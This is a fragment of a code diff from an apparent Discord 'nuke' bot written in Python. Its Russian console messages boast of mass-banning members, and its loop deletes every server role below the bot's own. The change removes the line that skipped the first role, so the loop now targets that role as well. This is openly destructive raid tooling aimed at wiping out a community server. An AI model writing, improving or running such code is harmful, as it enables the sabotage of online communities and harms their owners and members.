@@ -42,7 +42,6 @@ async def lol(ctx):
     print(f"{Fore.WHITE}> {Fore.RED}Усе, кого мох забанил, а мог я:{ban} человек{Fore.WHITE}.")
     print(f"{Fore.WHITE}> {Fore.RED}Теперь роли почистим{Fore.WHITE}...")
     roles = ctx.guild.roles
-    roles.pop(0)
     for role in roles:
         if ctx.guild.me.roles[-1] > role:
             await role.delete()
